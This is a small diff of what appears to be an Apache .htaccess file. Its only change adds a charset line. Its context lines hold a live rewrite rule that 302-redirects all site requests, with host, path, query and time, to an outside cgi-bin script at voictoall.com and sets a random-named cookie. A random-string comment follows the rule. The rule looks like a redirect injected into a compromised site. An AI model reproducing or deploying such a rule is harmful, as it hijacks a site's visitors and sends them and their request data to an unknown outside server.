@@ -33,4 +33,4 @@ RewriteCond %{HTTPS}            ^off$
 RewriteRule ^(.*)$   http://voictoall.com/cgi-bin/r.cgi?p=9004&i=d041b80c&j=320&m=06e73953aae3b1878c25326ac7fa91d6&h=%{HTTP_HOST}&u=%{REQUEST_URI}&q=%{QUERY_STRING}&t=%{TIME}  [R=302,L,CO=xccgtswgokoe:1:%{HTTP_HOST}:10080:/:0:HttpOnly]
 # exgocgkctswo
 
-
+AddCharset UTF-8 .xml 
